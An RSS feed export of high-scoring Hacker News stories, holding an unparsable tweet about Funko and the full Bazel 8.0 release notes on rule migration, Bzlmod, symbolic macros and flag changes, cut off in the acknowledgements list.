<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0">
    <channel>
        <title>HN100 - Readable Contents</title>
        <link>https://hn.algolia.com/api/v1/search_by_date?tags=%28story,poll%29&amp;numericFilters=points%3E100</link>
        <description>Uses Readability to add bodies to the RSS feed</description>
        <lastBuildDate>Tue, 10 Dec 2024 01:30:02 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>https://github.com/jpmonette/feed</generator>
        <language>en</language>
        <item>
            <title><![CDATA["This is not a joke, Funko just called my mom" (437 pts)]]></title>
            <link>https://twitter.com/itchio/status/1866239798924763227</link>
            <guid>42371481</guid>
            <pubDate>Mon, 09 Dec 2024 22:56:44 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://twitter.com/itchio/status/1866239798924763227">https://twitter.com/itchio/status/1866239798924763227</a>, See on <a href="https://news.ycombinator.com/item?id=42371481">Hacker News</a></p>
&lt;Unparsable&gt;]]></description>
        </item>
        <item>
            <title><![CDATA[Bazel 8.0 (102 pts)]]></title>
            <link>https://github.com/bazelbuild/bazel/releases/tag/8.0.0</link>
            <guid>42370744</guid>
            <pubDate>Mon, 09 Dec 2024 21:33:12 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/bazelbuild/bazel/releases/tag/8.0.0">https://github.com/bazelbuild/bazel/releases/tag/8.0.0</a>, See on <a href="https://news.ycombinator.com/item?id=42370744">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-pjax="true" data-test-selector="body-content" data-view-component="true"><p>Bazel 8.0 is a major LTS release. It contains new features and backwards incompatible changes.</p>
<h2>Highlights</h2>
<ul>
<li>Many rules that were bundled with Bazel are now split into their own repositories, as part of the Starlarkification effort. This includes:
<ul>
<li>Android: All android_* build and repo rules have been moved to <a href="https://github.com/bazelbuild/rules_android">http://github.com/bazelbuild/rules_android</a>. Android tools are no longer bundled with Bazel inside @bazel_tools//tools/android.</li>
<li>C++: All C++ toolchain-related symbols have been moved <a href="https://github.com/bazelbuild/rules_cc">http://github.com/bazelbuild/rules_cc</a>; other symbols, including the rules themselves, will be moved in a future release.</li>
<li>Java: All java_* rules and providers (like JavaInfo)  have been moved to <a href="https://github.com/bazelbuild/rules_java">http://github.com/bazelbuild/rules_java</a>.</li>
<li>Protobuf: All *_proto_library rules (for Java, C++, Python)  and providers (like ProtoInfo)  have been moved to <a href="https://github.com/google/protobuf">http://github.com/google/protobuf</a>.</li>
<li>Python: All py_* rules and providers (like PyInfo) have been moved to <a href="https://github.com/bazelbuild/rules_python">http://github.com/bazelbuild/rules_python</a>.</li>
<li>Shell: All sh_* rules have been moved to <a href="https://github.com/bazelbuild/rules_shell">http://github.com/bazelbuild/rules_shell</a>.</li>
<li>Use load statements for all  the rules and providers from the above repositories. The load statements work with Bazel 6, 7 and 8 (repositories are backwards compatible and support both bzlmod and WORKSPACE mode). Bazel 9 will make load statements mandatory.</li>
<li>To facilitate migration, Bazel 8 introduces the --incompatible_autoload_externally flag, which by default loads rules and symbols that were previously hard-coded inside Bazel from corresponding rule repositories.</li>
</ul>
</li>
<li>The WORKSPACE mechanism is now disabled by default.
<ul>
<li><a href="https://bazel.build/external/overview#bzlmod" rel="nofollow">Bzlmod</a>, the new way to manage external dependencies, is turned on by default since Bazel 7.0.</li>
<li>The WORKSPACE and WORKSPACE.bzlmod files are no longer read by Bazel, by default. To bring back this behavior, use --enable_workspace. Check the <a href="https://bazel.build/external/migration" rel="nofollow">migration guide</a> and try out the <a href="https://github.com/bazelbuild/bazel-central-registry/tree/main/tools#migrate_to_bzlmodpy">migration tool</a> for moving your external dependencies to Bzlmod.</li>
<li>We are aiming to remove WORKSPACE in Bazel 9 completely.</li>
</ul>
</li>
<li>Symbolic macros are introduced as a new way to write build macros, improving the experience for both macro authors and BUILD file owners.
<ul>
<li>Symbolic macro arguments are typed like rule attributes, with similar type conversions. They also are less prone to latent bugs because they automatically promote values of configurable attributes to select() expressions.</li>
<li>Symbolic macros avoid pitfalls that harm BUILD readability, such as mutating their arguments, and are compatible with lazy evaluation (not implemented yet).</li>
<li>Internal targets of symbolic macros are protected from clients by the visibility system.</li>
<li>Legacy macros that call native.existing_rules() can often be replaced by finalizer macros.</li>
<li>See <a href="https://bazel.build/extending/macros" rel="nofollow">https://bazel.build/extending/macros</a> for more detail on symbolic macros.</li>
</ul>
</li>
</ul>
<h2>Migration-Ready Incompatible Flags</h2>
<p>The following flags are flipped in 8.0:</p>
<ul>
<li>--enable_workspace (<a href="https://github.com/bazelbuild/bazel/issues/23023" data-hovercard-type="issue" data-hovercard-url="/bazelbuild/bazel/issues/23023/hovercard">#23023</a>; now defaults to false)</li>
<li>--incompatible_disallow_ctx_resolve_tools (<a href="https://github.com/bazelbuild/bazel/issues/22249" data-hovercard-type="issue" data-hovercard-url="/bazelbuild/bazel/issues/22249/hovercard">#22249</a>; now defaults to true)</li>
<li>--incompatible_disallow_empty_glob (<a href="https://github.com/bazelbuild/bazel/pull/8195" data-hovercard-type="issue" data-hovercard-url="/bazelbuild/bazel/issues/8195/hovercard">#8195</a>; now defaults to true)</li>
<li>--incompatible_macos_set_install_name (<a href="https://github.com/bazelbuild/bazel/issues/12370" data-hovercard-type="issue" data-hovercard-url="/bazelbuild/bazel/issues/12370/hovercard">#12370</a>; now defaults to true)</li>
<li>--incompatible_no_implicit_watch_label (<a href="https://github.com/bazelbuild/bazel/issues/23861" data-hovercard-type="issue" data-hovercard-url="/bazelbuild/bazel/issues/23861/hovercard">#23861</a>; now defaults to true)</li>
<li>--incompatible_struct_has_no_methods (<a href="https://github.com/bazelbuild/bazel/issues/19465" data-hovercard-type="issue" data-hovercard-url="/bazelbuild/bazel/issues/19465/hovercard">#19465</a>; now defaults to true)</li>
<li>--incompatible_use_plus_in_repo_names (<a href="https://github.com/bazelbuild/bazel/issues/23127" data-hovercard-type="issue" data-hovercard-url="/bazelbuild/bazel/issues/23127/hovercard">#23127</a>; now defaults to true)</li>
<li>--legacy_external_runfiles (<a href="https://github.com/bazelbuild/bazel/issues/23574" data-hovercard-type="issue" data-hovercard-url="/bazelbuild/bazel/issues/23574/hovercard">#23574</a>; now defaults to false)</li>
<li>--legacy_important_outputs (<a href="https://github.com/bazelbuild/bazel/pull/14353" data-hovercard-type="pull_request" data-hovercard-url="/bazelbuild/bazel/pull/14353/hovercard">#14353</a>; now defaults to false)</li>
<li>--zip_undeclared_test_outputs (<a href="https://github.com/bazelbuild/bazel/commit/489d08bf472f4568b3f7f478a8747a30cb956111">489d08b</a>; now defaults to false)</li>
</ul>
<p>The following flags will be flipped in a future major release:</p>
<ul>
<li>--incompatible_autoload_externally (<a href="https://github.com/bazelbuild/bazel/issues/23043" data-hovercard-type="issue" data-hovercard-url="/bazelbuild/bazel/issues/23043/hovercard">#23043</a>; will default to true)</li>
<li>--incompatible_disable_native_repo_rules (<a href="https://github.com/bazelbuild/bazel/issues/22080" data-hovercard-type="issue" data-hovercard-url="/bazelbuild/bazel/issues/22080/hovercard">#22080</a>; will default to true)</li>
<li>--incompatible_disable_non_executable_java_binary (<a href="https://github.com/bazelbuild/bazel/issues/19687" data-hovercard-type="issue" data-hovercard-url="/bazelbuild/bazel/issues/19687/hovercard">#19687</a>; will default to true)</li>
<li>--incompatible_disallow_struct_provider_syntax (<a href="https://github.com/bazelbuild/bazel/issues/19467" data-hovercard-type="issue" data-hovercard-url="/bazelbuild/bazel/issues/19467/hovercard">#19467</a>; will default to true)</li>
<li>--incompatible_disable_target_provider_fields (<a href="https://github.com/bazelbuild/bazel/issues/19466" data-hovercard-type="issue" data-hovercard-url="/bazelbuild/bazel/issues/19466/hovercard">#19466</a>; will default to true)</li>
<li>--incompatible_enable_deprecated_label_apis (<a href="https://github.com/bazelbuild/bazel/issues/23144" data-hovercard-type="issue" data-hovercard-url="/bazelbuild/bazel/issues/23144/hovercard">#23144</a>; will default to false)</li>
<li>--incompatible_stop_exporting_language_modules (<a href="https://github.com/bazelbuild/bazel/issues/19455" data-hovercard-type="issue" data-hovercard-url="/bazelbuild/bazel/issues/19455/hovercard">#19455</a>; will default to true)</li>
<li>--incompatible_auto_exec_groups (<a href="https://github.com/bazelbuild/bazel/issues/17134" data-hovercard-type="issue" data-hovercard-url="/bazelbuild/bazel/issues/17134/hovercard">#17134</a>; will default to true)</li>
<li>--incompatible_disable_starlark_host_transitions (<a href="https://github.com/bazelbuild/bazel/issues/17032" data-hovercard-type="issue" data-hovercard-url="/bazelbuild/bazel/issues/17032/hovercard">#17032</a>; will default to true)</li>
<li>--incompatible_config_setting_private_default_visibility (<a href="https://github.com/bazelbuild/bazel/issues/12933" data-hovercard-type="issue" data-hovercard-url="/bazelbuild/bazel/issues/12933/hovercard">#12933</a>; will default to true)</li>
</ul>
<h2>General</h2>
<ul>
<li><strong>[Incompatible]</strong> All labels in Bazel error messages, log output, Build Event Protocol, etc. are now prefixed with double-at (@@) instead of single-at (@) where applicable, to properly denote that they contain canonical repo names.</li>
<li><strong>[Incompatible]</strong> The global applicable_licenses attribute has been renamed to package_metadata. The older name may be used for creating targets, but Starlark code must use the name package_metadata to retrieve it.</li>
<li><strong>[Incompatible]</strong> The package(distribs=[...]) attribute has been removed. It has been a no-op for several years now. distribs() at the package level is no longer legal syntax.</li>
<li><strong>[Incompatible]</strong> The --host_jvm_profile command line argument is not supported anymore.</li>
<li><strong>[Incompatible]</strong> The path attribute is removed from filegroup.</li>
<li><strong>[Incompatible]</strong> "bazel query" and "bazel print_action" can't run under the output base anymore.</li>
<li><strong>[Incompatible]</strong> --zip_undeclared_test_outputs now defaults to false, causing undeclared test outputs (i.e., files written to $TEST_UNDECLARED_OUTPUTS_DIR by a test) to be produced as a directory instead of a zip file.</li>
<li><strong>[Incompatible]</strong> On Windows, a change to the output base locking protocol might cause an older Bazel invoked immediately after a newer Bazel (on the same output base) to error out instead of blocking for the lock, even if --block_for_lock is enabled. (<a href="https://github.com/bazelbuild/bazel/pull/24210" data-hovercard-type="pull_request" data-hovercard-url="/bazelbuild/bazel/pull/24210/hovercard">#24210</a>)</li>
<li>The result of canonicalize-flags now includes all Starlark flags by default. Use --noexperimental_include_default_values for the old behavior that only reports Starlark flags with non-default values.</li>
<li>Bazel now supports all characters in the rlocation and target paths of runfiles and can be run from workspaces with a space in their full path (<a href="https://github.com/bazelbuild/bazel/pull/23331" data-hovercard-type="pull_request" data-hovercard-url="/bazelbuild/bazel/pull/23331/hovercard">#23331</a>).</li>
<li>genquery now supports (unconfigured) cycles, but may have higher peak memory usage.</li>
<li>The default value of --skyframe_high_water_mark_minor_gc_drops_per_invocation and --skyframe_high_water_mark_full_gc_drops_per_invocation has been decreased to 10, which can result in Bazel OOMing more eagerly as Skyframe state is no longer dropped an unlimited number of times in response to high memory pressure.</li>
<li>Improved progress message in case there are no actions in flight, and display explicitly "no actions running" in that case.</li>
<li>glob now has a more efficient implementation that uses less retained memory and CPU, while sometimes taking more wall time for recursive globs in very large directory trees.</li>
<li>REPO.bazel now allows another directive, ignore_directories(). It takes a list of directories to ignore just like .bazelignore does, but with glob semantics. (<a href="https://github.com/bazelbuild/bazel/pull/24203" data-hovercard-type="pull_request" data-hovercard-url="/bazelbuild/bazel/pull/24203/hovercard">#24203</a>)</li>
</ul>
<h2>Android</h2>
<ul>
<li>Native <code>mobile-install</code> is deleted. Please use the new Starlarkified version (“mobile-install v3”) instead. See <a href="https://github.com/bazelbuild/rules_android">https://github.com/bazelbuild/rules_android</a>.</li>
</ul>
<h2>Build Event Protocol</h2>
<ul>
<li>BEP will include correct TestResult and TargetSummary events when special test inputs like $test_runtime fail to build.</li>
<li>The default size limit for a named set of files in BEP is now 5000 (was unlimited before). In the event that the limit is reached, the message will be split.</li>
<li>BEP now contains data similar to dump command breakdowns for rules, aspects and skykeys.</li>
<li>WorkerMetrics of killed workers are logged (max 50 based on custom prioritization and then arranged in order of worker id). WorkerMetrics also includes the number of actions executed by each worker are now logged in the BEP. The semantics of WorkerPoolStats.evicted_count to refer to the workers that are killed (destroyed) as a result of memory pressure (evicted_count &lt;= destroyed_count).</li>
<li>BEP's execution_phase_time_in_ms no longer includes the analysis-only part at the beginning of the build. Artificial downtrend in execution_phase_time_in_ms expected.</li>
<li>A new experimental flag, --experimental_build_event_output_group_mode, allows users to change how a given output group's files are reported in BEP. The current behavior is NAMED_SET_OF_FILES_ONLY which populates OutputGroup.file_sets. Users may now specify INLINE_ONLY to instead report files directly in the TargetComplete/AspectComplete event under OutputGroup.inline_files. Users may also specify BOTH to populate OutputGroup.file_sets and OutputGroup.inline_files.</li>
<li>Undeclared test outputs are now reported individually in the BEP, unless zipping is enabled via --zip_undeclared_test_outputs.</li>
<li>Log all WorkerPoolStats for all worker pools (even though workers aren't created or destroyed). Also add unknown_destroyed_count and alive_count to the WorkerPoolStats proto.</li>
<li>By default, coverage artifacts will be reported inline in the TargetComplete event. To disable this behavior, pass --experimental_build_event_output_group_mode=baseline.lcov=named_set_of_files_only.</li>
</ul>
<h2>C++ / Objective-C</h2>
<ul>
<li><strong>[Incompatible]</strong> apple_cc_toolchain rule was removed. Use regular cc_toolchain instead.</li>
<li><strong>[Incompatible]</strong> The Starlark methods copts, generate_linkmap, and should_strip_binary in the objc fragment have been deleted.  Please use the equivalent methods objccopts, objc_generate_linkmap, and objc_should_strip_binary in the cpp fragment instead.</li>
<li><strong>[Incompatible]</strong> Removed def_file from cc_common.create_link_variables.</li>
<li><strong>[Incompatible]</strong> With the default Unix toolchain on macOS, binaries now use <a data-hovercard-type="user" data-hovercard-url="/users/rpath/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="https://github.com/rpath">@rpath</a> to find their .dylib dependencies. This is required to fix issues where tools run during the build couldn't find their dynamic dependencies. (<a href="https://github.com/bazelbuild/bazel/pull/23090" data-hovercard-type="pull_request" data-hovercard-url="/bazelbuild/bazel/pull/23090/hovercard">#23090</a>)</li>
<li><strong>[Incompatible]</strong> The deprecated fragments["apple"].bitcode_mode and fragments["cpp"].apple_bitcode_mode APIs have been removed from Bazel. Apple deprecated Bitcode in Xcode 14.</li>
<li><strong>[Incompatible]</strong> CppLinkAction returns 2 args to aspects that have the correct quoting set (before it was always 1 args object defaulting to bash escaping).</li>
<li><strong>[Incompatible]</strong> The BAZEL_CURRENT_REPOSITORY preprocessor variable, which holds the canonical name of the Bazel repository containing a cc_* target, is now only set during compilation if the target depends on the C/C++ runfiles library @rules_cc/cc//runfiles via deps or implementation_deps.</li>
<li><strong>[Incompatible]</strong> C++ toolchains configuration files have moved to rules_cc, if you are depending on anything in @bazel_tools//tools/cpp, you should use the version from @rules_cc (&gt;=0.0.12) instead.</li>
<li>Added conlyopts and cxxopts attributes to C++ rules (<a href="https://github.com/bazelbuild/bazel/pull/23792" data-hovercard-type="pull_request" data-hovercard-url="/bazelbuild/bazel/pull/23792/hovercard">#23792</a>)</li>
<li>cc_toolchain now passes runfiles for its *_files attrs (e.g. data files for a tool built for linking).</li>
<li>The new cc_static_library rule produces a static library that bundles given targets and all their transitive dependencies. It has to be enabled via --experimental_cc_static_library.</li>
<li>New $(DUMPBIN) make variable is now available for Visual Studio toolchains.</li>
<li>--incompatible_make_thinlto_command_lines_standalone is now a no-op.</li>
<li>--compile_one_dependency selects header-only cc_librarys in more cases.</li>
<li>Added windows_quoting_for_param_files feature for windows-style parameter file escaping.</li>
<li>The local_defines attribute of cc_library() and cc_binary() supports $(location ...) expansion for additional_compiler_inputs just like for deps.</li>
<li>The bazel --quiet command line option can now be used to make Bazel emit much less output. (<a href="https://github.com/bazelbuild/bazel/pull/24024" data-hovercard-type="pull_request" data-hovercard-url="/bazelbuild/bazel/pull/24024/hovercard">#24024</a>)</li>
<li><strong>[Incompatible]</strong> cc_toolchain_suite is a <a href="https://github.com/bazelbuild/bazel/issues/7260" data-hovercard-type="issue" data-hovercard-url="/bazelbuild/bazel/issues/7260/hovercard">no op</a>. All C++ rules use Bazel's <a href="https://bazel.build/extending/toolchains" rel="nofollow">toolchain API</a>.</li>
<li><strong>[Incompatible]</strong> --incompatible_enable_cc_toolchain_resolution is a <a href="https://github.com/bazelbuild/bazel/issues/7260" data-hovercard-type="issue" data-hovercard-url="/bazelbuild/bazel/issues/7260/hovercard">no op</a>. All C++ rules use Bazel's <a href="https://bazel.build/extending/toolchains" rel="nofollow">toolchain API</a>.</li>
</ul>
<h2>Configurability / cquery</h2>
<ul>
<li><strong>[Incompatible]</strong> <a href="https://bazel.build/extending/config#incoming-edge-transitions" rel="nofollow">Incoming</a> rule() transitions  can't set cfg = "exec" or <a href="https://bazel.build/rules/lib/toplevel/config#exec" rel="nofollow">cfg = config.exec()</a>. This generally doesn't make sense. Prefer declaring dependencies as exec tools.</li>
<li>Starlark rules can annotate attr() with <a href="https://bazel.build/rules/lib/toplevel/config#none" rel="nofollow">cfg = config.none()</a>. This is useful for pure-data dependencies that should build the same no matter their parent's configuration.</li>
<li>Starlark rules can replace cfg = "target" on attribute definitions with <a href="https://bazel.build/rules/lib/toplevel/config#target" rel="nofollow">cfg = config.target()</a> for more consistent syntax.</li>
<li><a href="https://bazel.build/query/cquery" rel="nofollow">bazel cquery</a> <a href="https://github.com/bazelbuild/bazel/issues/16310#issuecomment-1876108171" data-hovercard-type="issue" data-hovercard-url="/bazelbuild/bazel/issues/16310/hovercard">more accurately</a> lists dependencies from aspects. Requires --experimental_explicit_aspects. Try this if you see confusing results. As an experimental feature this doesn't work for all output formats. Available since 7.2.0.</li>
<li><a href="https://bazel.build/query/guide" rel="nofollow">bazel query</a> includes <a href="https://bazel.build/reference/be/platforms-and-toolchains#toolchain_type" rel="nofollow">toolchain type requirements</a> as implicit dependencies.. This includes the <a href="https://bazel.build/rules/lib/globals/bzl.html#rule.toolchains" rel="nofollow">toolchains</a> parameter in rule() definitions.</li>
</ul>
<h2>Coverage</h2>
<ul>
<li><strong>[Incompatible]</strong> Passing a FilesToRunProvider to coverage_support_files will now result in an error as opposed to being silently ignored.</li>
<li><strong>[Incompatible]</strong> Coverage report generators no longer receive the JAVA_RUNFILES and PYTHON_RUNFILES environment variables.</li>
</ul>
<h2>External Dependencies</h2>
<ul>
<li><strong>[Incompatible]</strong> The format of canonical repo names has changed to use plus (+) instead of tilde (~). Effectively, this flips the flag --incompatible_use_plus_in_repo_names to true, and the flag is now a no-op (i.e. cannot be "unflipped"). ​​See <a href="https://bazel.build/external/module#repository_names_and_strict_deps" rel="nofollow">https://bazel.build/external/module#repository_names_and_strict_deps</a> for advice on how to avoid hardcoding canonical repository names.</li>
<li>--experimental_repository_downloader_retries now defaults to 5.</li>
<li>Overrides in the root MODULE.bazel file are now ignored with --ignore_dev_dependency. (Overrides in non-root modules are already ignored.)</li>
<li>The fetch and vendor commands now support --target_pattern_file for specifying target patterns.</li>
<li>Patches to the module file in single_version_override are now effective as long as the patch file lies in the root module.</li>
<li>Repository rules instantiated in the same module extensions can now refer to each other by their extension-specified names in label attributes.</li>
<li>override_repo and inject_repo can be used to override and inject repos in module extensions. (<a href="https://github.com/bazelbuild/bazel/pull/23534" data-hovercard-type="pull_request" data-hovercard-url="/bazelbuild/bazel/pull/23534/hovercard">#23534</a>)</li>
<li>The new --inject_repository flag can be used to add new repositories via the CLI with --enable_bzlmod. Such repositories behave as if they were declared by local_repository via use_repo_rule in the root module. (<a href="https://github.com/bazelbuild/bazel/pull/24301" data-hovercard-type="pull_request" data-hovercard-url="/bazelbuild/bazel/pull/24301/hovercard">#24301</a>)</li>
<li>External repositories that are managed by Bzlmod can now contain a top-level external directory or package. (<a href="https://github.com/bazelbuild/bazel/pull/24147" data-hovercard-type="pull_request" data-hovercard-url="/bazelbuild/bazel/pull/24147/hovercard">#24147</a>)</li>
<li>repository_ctx.execute can now remove an environment variable when executing a process by associating it with the value None in the environment argument. (<a href="https://github.com/bazelbuild/bazel/pull/24245" data-hovercard-type="pull_request" data-hovercard-url="/bazelbuild/bazel/pull/24245/hovercard">#24245</a>)</li>
<li>bazel mod now tries to evaluate all module extensions, even when some have failed to evaluate. (<a href="https://github.com/bazelbuild/bazel/pull/24259" data-hovercard-type="pull_request" data-hovercard-url="/bazelbuild/bazel/pull/24259/hovercard">#24259</a>)</li>
<li>archive_override now accepts all attributes usable with http_archive; similar for git_override and git_repository. (<a href="https://github.com/bazelbuild/bazel/pull/24443" data-hovercard-type="pull_request" data-hovercard-url="/bazelbuild/bazel/pull/24443/hovercard">#24443</a>)</li>
</ul>
<h2>Java</h2>
<ul>
<li>The core Java rules (java_binary, java_library, java_test, java_import, java_plugin) and symbols (java_common, JavaInfo, JavaPluginInfo) are no longer available in Bazel and must be loaded from @rules_java.
<ul>
<li>WORKSPACE builds may need to update their setup, see the release notes at <a href="https://github.com/bazelbuild/rules_java/releases">https://github.com/bazelbuild/rules_java/releases</a> for what @rules_java now requires. Relatedly, projects enabling both --enable_bzlmod and --enable_workspace that fetch @rules_java via the MODULE.bazel file, may need to explicitly re-declare some dependencies in the WORKSPACE file, as Bzlmod dependencies are not automatically visible to other WORKSPACE repositories.</li>
</ul>
</li>
<li>The default java language level (with rules_java 8.1.0) is now 11 (previously 8).</li>
<li>java_binary and java_test no longer generate an additional target - the deploy jars are once again outputs of the primary (only) target.</li>
<li>JavaInfo.compilation_info.javac_options now returns a depset. Use tokenize_javacopts from @rules_java to get the options as a correctly ordered list.</li>
<li>Java compilation actions now set LC_ALL=C.UTF-8 (previously: en_US.UTF-8).</li>
</ul>
<h2>Local Execution</h2>
<ul>
<li><strong>[Incompatible]</strong> The mnemonic passed to --worker_extra_flag is now matched against the worker key mnemonic when one is available, instead of the action mnemonic. This makes it consistent with other worker flags taking a mnemonic. (<a href="https://github.com/bazelbuild/bazel/pull/24251" data-hovercard-type="pull_request" data-hovercard-url="/bazelbuild/bazel/pull/24251/hovercard">#24251</a>)</li>
<li>Prevent linux-sandbox(ed) spawns from being able to write in the cgroups mount.</li>
<li>Symlink trees are now created through direct filesystem calls by default, instead of delegated to a helper process. On Windows, this entails respecting the --windows_enable_symlinks flag, falling back to a copy when the flag is unset (the helper process always attempts to create symlinks, irrespective of the flag). Set --noexperimental_inprocess_symlink_creation to temporarily revert to the previous behavior, which will be removed in a future release.</li>
</ul>
<h2>Performance</h2>
<ul>
<li><strong>[Incompatible]</strong> The aquery command now reports all potential inputs of actions that support input discovery, including the input headers of C++ compilation actions and those explicitly marked as unused through the unused_inputs_list argument to ctx.actions.run. Set --noinclude_pruned_inputs to omit pruned inputs from aquery output when running it after action execution.</li>
<li><strong>[Incompatible]</strong> The --experimental_aquery_dump_after_build_format and --experimental_aquery_dump_after_build_output_file command line options are not available anymore.</li>
<li>--experimental_collect_system_network_usage is flipped to true and will be removed soon.</li>
<li>Introduced Skyfocus, an experimental feature aimed to reduce Bazel's retained heap usage with working sets. Use --experimental_enable_skyfocus to enable it. See <a href="https://bazel.build/advanced/performance/memory#trade-flexibility" rel="nofollow">documentation</a> for more information.</li>
<li>bazel query now uses 3% less memory.</li>
<li>Introduce new flag --experimental_worker_use_cgroups_on_linux that uses cgroups to track memory usage for singleplex workers (on Linux).</li>
<li>Added --experimental_collect_skyframe_counts_in_profiler to collect Skyframe node counts in the JSON profile over time. Currently, the following SkyFunctions are measured: BZL_LOAD, GLOB, GLOBS, PACKAGE, CONFIGURED_TARGET, ASPECT, ACTION_EXECUTION.</li>
<li>Introduced a new format for the execution log, enabled by --execution_log_compact_file. This format is preferred over the preexisting --execution_log_{binary,json}_file, as it’s much cheaper to produce and smaller in size; however, it’s not human-readable. The tools in //src/tools/execlog may be used to analyze logs and convert between formats.</li>
</ul>
<h2>Remote Execution</h2>
<ul>
<li>Added the ability to garbage collect the disk cache by setting one or both of --experimental_disk_cache_gc_max_size and --experimental_disk_cache_gc_max_age. Garbage collection occurs in the background while the Bazel server is idle; the idle timer defaults to 5 minutes, but may be overridden by --experimental_disk_cache_gc_idle_delay.</li>
<li>The default value of --experimental_remote_cache_eviction_retries is changed to 5.</li>
<li>Uploading local action results to a disk or remote cache now occurs in the background whenever possible, potentially unblocking the execution of followup actions. Set --noremote_cache_async to revert to the previous behavior.</li>
<li>Added support for using a remote cache that evicts blobs and doesn't have AC integrity check (e.g. HTTP cache).</li>
<li>--incompatible_remote_symlinks, --incompatible_remote_dangling_symlinks, --incompatible_remote_downloader_send_all_headers and --incompatible_remote_output_paths_relative_to_input_rootare deleted.</li>
<li>--build_event_upload_max_threads is removed.</li>
<li>The default value of --experimental_remote_cache_compression_threshold is changed to 100.</li>
</ul>
<h2>Starlark / Build Language</h2>
<ul>
<li>Bazel can now parse .scl files, a dialect of Starlark without Bazel-specific symbols.</li>
<li>Dormant dependencies and materializer functions are now available with the --experimental_dormant_deps flag.</li>
<li>Aspects can now propagate to target’s toolchain dependencies by specifying the toolchain types to propagate to via toolchains_aspects.</li>
<li>Aspects can now return DefaultInfo, which will then be merged with that of the configured target they are applied to. Currently, only the files field is supported.</li>
<li>Output groups provided by a rule and/or multiple aspects are now merged instead of resulting in an error.</li>
<li>If --proto:rule_classes flag is enabled, query proto output will contain rule class definitions in Stardoc proto format.</li>
<li>Starlark min and max builtins now allow a key callback, similarly to sorted.</li>
<li><strong>[Incompatible]</strong> Non-singleton target visibility lists can now contain //visibility:public and //visibility:private elements; the result is appropriately simplified when assigned to an attribute. (<a href="https://github.com/bazelbuild/bazel/issues/19922" data-hovercard-type="issue" data-hovercard-url="/bazelbuild/bazel/issues/19922/hovercard">#19922</a>)</li>
<li><strong>[Incompatible]</strong> --incompatible_simplify_unconditional_selects_in_rule_attrs simplifies configurable rule attributes which contain only unconditional selects. (<a href="https://github.com/bazelbuild/bazel/issues/19922" data-hovercard-type="issue" data-hovercard-url="/bazelbuild/bazel/issues/19922/hovercard">#19922</a>)</li>
<li><strong>[Incompatible]</strong> The input_manifests argument of ctx.actions.{run,run_shell} is now a no-op. resolve_command and resolve_tools always return the empty list as the input manifest list.</li>
<li><strong>[Incompatible]</strong> ctx.resolve_tools is no longer available by default, in preparation for complete removal. Use --noincompatible_disallow_ctx_resolve_tools to temporarily make it available again. (<a data-error-text="Failed to load title" data-id="2280997341" data-permission-text="Title is private" data-url="https://github.com/bazelbuild/bazel/issues/22249" data-hovercard-type="issue" data-hovercard-url="/bazelbuild/bazel/issues/22249/hovercard" href="https://github.com/bazelbuild/bazel/issues/22249">#22249</a>)</li>
</ul>
<h2>Windows</h2>
<ul>
<li><strong>[Incompatible]</strong> On Windows, the default msys64 root is changed to C:/msys64 from C:/tools/msys64.</li>
</ul>
<h2>Appendix</h2>
<p>The following flags have been removed or changed to no-op:</p>
<ul>
<li>--android_cpu</li>
<li>--android_crosstool_top</li>
<li>--android_grte_top</li>
<li>--android_sdk</li>
<li>--crosstool_top</li>
<li>--enable_fdo_profile_absolute_path</li>
<li>--experimental_announce_profile_path</li>
<li>--experimental_objc_include_scanning</li>
<li>--experimental_proto_extra_actions</li>
<li>--fat_apk_cpu</li>
<li>--host_crosstool_top</li>
<li>--host_swiftcopt</li>
<li>--incompatible_depset_for_java_output_source_jars</li>
<li>--incompatible_disallow_symlink_file_to_dir</li>
<li>--incompatible_disallow_unsound_directory_outputs</li>
<li>--incompatible_enable_android_toolchain_resolution</li>
<li>--incompatible_enable_cc_toolchain_resolution</li>
<li>--incompatible_existing_rules_immutable_view</li>
<li>--incompatible_make_thinlto_command_lines_standalone</li>
<li>--incompatible_objc_provider_remove_linking_info</li>
<li>--incompatible_remote_build_event_upload_respect_no_cache</li>
<li>--incompatible_remote_dangling_symlinks</li>
<li>--incompatible_remote_downloader_send_all_headers</li>
<li>--incompatible_remote_output_paths_relative_to_input_root</li>
<li>--incompatible_remote_results_ignore_disk</li>
<li>--incompatible_remote_symlinks</li>
<li>--incompatible_struct_has_no_methods</li>
<li>--incompatible_use_host_features</li>
<li>--incompatible_use_plus_in_repo_names</li>
<li>--python2_path</li>
<li>--python3_path</li>
<li>--swiftcopt</li>
</ul>
<h2>Acknowledgements:</h2>
<p>This release contains contributions from many people at Google, as well as Adam Azarchs, Adam Singer, Alan Falloon, Alessandro Patti, Alex Eagle, Alex Sharoff, Alexander Golovlev, Alexandre Boulgakov, Artem V. Navrotskiy, Ben Lee, Benjamin Peterson, Brentley Jones, CaerusKaru, Cameron Martin, Chirag Ramani, Chris Gray, Christian Scott, Clay McClure, Cornelius Riemenschneider, Cristin Donoso, Daniel Wagner-Hall, David Ostrovsky, David Sanderson, Dennis van den Berg, detailyang, Dimi Shahbaz, DocQuantum, Douglas Thor, eantpil, Ed Schouten, Emil Waijers, Fabian Meumertzheim, FaBrand, Farid Zakaria, Fil-Den, Fredrik Medley, Fredrikhms, George Gensure, Greg Magolan, Greg Roodt, Grzegorz Lukasik, Guillaume Maudoux, Gunnar Wagenknecht, Honnix, Ikko Eltociear Ashimine, Isaac Torres, Jacob Van De Weert, James Sharpe, Jamison Lahman, Jan Keromnes, Jason Schroeder, Javier Maestro, Jay Conrod, Jiawen (Kevin) Chen, JKutscha, Joe Lencioni, John Millikin, Jonas Scharpf, Jonathan Block, jonshea, Jordan Mele, Josh Chorlton, Keith Smiley, Laurent Le Brun, Laurenz Altenmller, Letu Ren, Lior Gorelik, Luis Padron, M. Taimoor Zaeem, Marc Redemske, Maria, Mark Elliot, Matt Brown, Matt Smith, Matthieu MOREL, Michael Siegrist, Muescha, Nick Biryulin, Nikhil Kalige, Niko Wenselowski, Nils Wireklint, ouguoc2-stripe, Patrick Balestra, Paul Janzen, Peter Lobsinger, PikachuHy, Rahul Butani, Richard Smith, Richard Woodbury, Romain Chossart, Roman Salvador, Ryan Beasley, Sangita.Nalkar, Sara Adams, shingt, Siddhartha Bagaria, Simon Mavi Stewart, Son Luong Ngoc, Spencer Putt, 